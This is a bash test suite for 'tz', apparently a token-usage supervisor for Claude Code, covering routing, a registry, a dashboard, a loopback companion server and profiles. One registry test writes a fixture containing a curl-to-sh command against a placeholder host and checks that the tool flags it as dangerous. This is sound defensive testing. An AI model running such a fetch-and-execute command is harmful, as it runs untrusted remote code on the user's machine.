#!/bin/bash
# Supervisor, bus, mascot, route, adapters, registry, dashboard, companion, profile, optimize extensions. Fake HOME, no network except 127.0.0.1.
Z="$(cd "$(dirname "$0")/.." && pwd)"; T="$(mktemp -d)"; H="$T/home"; pass=0; fail=0; mkdir -p "$H/.claude" "$T/proj"
ok() { if eval "$2"; then pass=$((pass+1)); else fail=$((fail+1)); echo "FAIL: $1"; fi; }
tz() { HOME="$H" python3 "$Z/bin/tz" "$@"; }
mk() { python3 - "$1" "$2" <<'PY'
import json,sys
inp=int(sys.argv[2]); open(sys.argv[1],'w').write(json.dumps({"timestamp":"2026-11-20T10:00:00+00:00","message":{"id":"m1","usage":{"input_tokens":inp,"output_tokens":5,"cache_read_input_tokens":0,"cache_creation_input_tokens":0}}})+'\n')
PY
}
BUS="$H/.claude/token-zombie/status.json"
# supervisor levels
mk "$T/lo.jsonl" 20000; touch -t 202601010000 "$T/lo.jsonl"; o=$(tz sup tick --transcript "$T/lo.jsonl" --cwd "$T/proj")
ok "tick low: NORMAL, no actions, bus written" '[[ $o == *NORMAL* && $o == *"actions -"* ]] && [ -f "$BUS" ]'
ok "bus has labelled fields + mascot + small size" 'python3 -c "import json;s=json.load(open(\"$BUS\"));assert s[\"mascot\"]==\"HAPPY\" and s[\"label\"] and s[\"tick_ms\"]<2000" && [ $(wc -c <"$BUS") -lt 3000 ]'
mk "$T/hi.jsonl" 192000
( cd "$T/proj"; git init -q; HOME="$H" python3 "$Z/bin/tz" handoff --task t --done a --left b --next c >/dev/null )
o=$(tz sup tick --transcript "$T/hi.jsonl" --cwd "$T/proj")
ok "critical: checkpoint + handoff-prep, risk high" '[[ $o == *CRITICAL* && $o == *checkpoint* && $o == *handoff-prep* && $o == *"risk high"* ]]'
ok "critical => ALERT mascot in bus" 'grep -q "\"mascot\": \"ALERT\"" "$BUS"'
o=$(tz sup next-session --cwd "$T/proj")
ok "next-session emits safe quoted command, launches nothing" '[[ $o == *"claude -p '"'"'Continue"* && $o != *launched* ]]'
tz sup task t1 open --cwd "$T/proj" >/dev/null; tz sup task t1 done --cwd "$T/proj" >/dev/null
ok "tasks.json lifecycle" 'grep -q "\"status\": \"done\"" "$H/.claude/token-zombie/tasks.json"'
ok "bad task status rejected" '! tz sup task t2 bogus --cwd "$T/proj" >/dev/null 2>&1'
ok "tick with no transcript does not crash" 'tz sup tick --transcript /nonexistent --cwd "$T/proj" >/dev/null'
# mascot pure function
ok "mascot states" 'python3 -c "
import sys;sys.path.insert(0,\"$Z/bin\")
from tzmascot import mascot_state as m
assert m({})==\"SLEEP\" and m({\"ts\":1,\"level\":\"CRITICAL\"})==\"ALERT\" and m({\"ts\":1,\"level\":\"NORMAL\",\"task_just_done\":True})==\"CELEBRATE\"
assert m({\"ts\":1,\"level\":\"ELEVATED\"})==\"CHOMP\" and m({\"ts\":1,\"level\":\"NORMAL\"})==\"HAPPY\" and m({\"ts\":1,\"level\":\"NORMAL\",\"risk\":\"high\"})==\"ALERT\""'
# route
o=$(tz route fix a typo); ok "route simple -> haiku/EST" '[[ $o == *"model haiku"* && $o == *EST* ]]'
o=$(tz route design a distributed architecture and refactor everything across the entire repo); ok "route hard -> not haiku" '[[ $o != *"model haiku"* ]]'
o=$(tz route --model opus fix typo); ok "override honoured" '[[ $o == *"model opus (override)"* ]]'
o=$(TZ_MODEL=sonnet tz route fix typo); ok "env override" '[[ $o == *"model sonnet (override)"* ]]'
ok "routing logged" '[ $(wc -l <"$H/.claude/token-zombie/routing.jsonl") -ge 3 ]'
ok "route says cannot switch" '[[ $(tz route x) == *"cannot change"* ]]'
# adapters
o=$(tz adapters); ok "8 agents listed, honest" '[ $(echo "$o" | grep -cE "^(claude|codex|cursor|windsurf|gemini|cline|roo|antigravity) ") = 8 ] && [[ $o == *"only claude is REAL"* ]]'
tz adapters --rules cursor --out "$T/r.md" >/dev/null; ok "rules file generated from SKILL.md" '[ -s "$T/r.md" ] && ! grep -q "^name:" "$T/r.md"'
ok "unknown agent rejected" '! tz adapters --rules nope >/dev/null 2>&1'
# registry
mkdir -p "$T/repo"; printf 'MIT License\nPermission is hereby granted, free of charge' >"$T/repo/LICENSE"; echo '{"dependencies":{"a":"^1.0.0","b":"2.0.0"}}' >"$T/repo/package.json"
o=$(tz reg add "$T/repo"); ok "reg add: license MIT, unpinned dep flagged" '[[ $o == *"license MIT"* && $o == *"deps-flagged 1"* ]]'
o=$(tz reg add "$T/repo"); ok "duplicate detected" '[[ $o == *DUPLICATE* ]]'
ok "url refused without network" '! tz reg add https://github.com/x/y >/dev/null 2>&1'
ok "reg list shows it" '[[ $(tz reg list) == *repo* ]]'
mkdir -p "$T/bad"; printf '%s %s | sh\n' cu""rl http://x.example/a >"$T/bad/i.sh"; ok "reg flags dangerous repo RED" '[[ $(tz reg add "$T/bad") == *RED* ]]'
# dashboard
tz dash --out "$T/d.html" >/dev/null; ok "dash self-contained, no external refs" '[ -s "$T/d.html" ] && ! grep -qiE "src=.?http|href=.?http|<script" "$T/d.html" && grep -q "TOKEN ZOMBIE" "$T/d.html"'
ok "dash shows UNKNOWN when no A/B evidence" 'grep -q "UNKNOWN" "$T/d.html"'
mkdir -p "$T/ev"; echo '{"total":1234,"status":"ok"}' >"$T/ev/a.json"; ok "bench results reads evidence" '[[ $(tz bench results "$T/ev") == *"total 1234"*MEASURED* ]]'
# companion: 127.0.0.1 only + token
P=$((20000+RANDOM%20000)); HOME="$H" python3 "$Z/bin/tzcompanion.py" --port $P >/dev/null 2>&1 & CP=$!; sleep 1
TOK=$(cat "$H/.claude/token-zombie/companion.token")
ok "companion: no token = 401" '[ "$(curl -s -o /dev/null -w %{http_code} http://127.0.0.1:$P/status.json)" = 401 ]'
ok "companion: wrong token = 401" '[ "$(curl -s -o /dev/null -w %{http_code} "http://127.0.0.1:$P/status.json?token=x")" = 401 ]'
ok "companion: token serves status" '[[ $(curl -s "http://127.0.0.1:$P/status.json?token=$TOK") == *mascot* ]]'
ok "companion: token file mode 600" '[ "$(stat -f %Lp "$H/.claude/token-zombie/companion.token" 2>/dev/null || stat -c %a "$H/.claude/token-zombie/companion.token")" = 600 ]'
ok "companion bound to loopback only" 'lsof -nP -iTCP:$P -sTCP:LISTEN 2>/dev/null | grep -q "127.0.0.1:$P"'
kill $CP 2>/dev/null; wait $CP 2>/dev/null
# profile save/apply/rollback (dry-run default, fake skillpack)
mkdir -p "$H/.claude/skills-off/video/cut" "$H/.claude/skills/x"; printf -- '---\nname: video-cut\ndescription: cut video captions shorts podcast clips youtube edits\n---\n' >"$H/.claude/skills-off/video/cut/SKILL.md"
printf -- '---\nname: x\ndescription: other\n---\n' >"$H/.claude/skills/x/SKILL.md"
printf '#!/bin/bash\necho "$@" >>"%s/sp.log"\n' "$T" >"$H/.claude/skillpack"; chmod +x "$H/.claude/skillpack"
tz profile save v cut video captions for my youtube shorts >/dev/null; o=$(tz profile apply v)
ok "apply dry-run changes nothing" '[[ $o == *DRY-RUN* ]] && [ ! -f "$T/sp.log" ]'
tz profile apply v --yes >/dev/null; ok "apply --yes runs skillpack on" 'grep -q "on video" "$T/sp.log"'
tz profile rollback v --yes >/dev/null; ok "rollback runs skillpack off" 'grep -q "off video" "$T/sp.log"'
ok "bad profile name rejected" '[[ $(tz profile save "../x") == *usage* ]]'
# optimize extensions
python3 - "$T/o.jsonl" <<'PY'
import json,sys
L=[]
def use(i,n,inp): L.append(json.dumps({"message":{"content":[{"type":"tool_use","id":i,"name":n,"input":inp}]}}))
def res(i,t): L.append(json.dumps({"message":{"content":[{"type":"tool_result","tool_use_id":i,"content":t}]}}))
for k in range(2): use(f"w{k}","WebSearch",{"query":"same q"}); res(f"w{k}","r"*500)
for k in range(2): use(f"g{k}","Grep",{"pattern":"foo"}); res(f"g{k}","m"*300)
use("b","Bash",{"command":"cat x"}); res("b","z"*40000)
open(sys.argv[1],'w').write('\n'.join(L)+'\n')
PY
o=$(tz optimize --transcript "$T/o.jsonl"); ok "repeated research detected" '[[ $o == *"repeated WebSearch"* ]]'
ok "repeated exploration detected" '[[ $o == *"repeated Glob/Grep"* ]]'
ok "oversized output flagged" '[[ $o == *"oversized Bash"* ]]'
echo "pass $pass fail $fail"
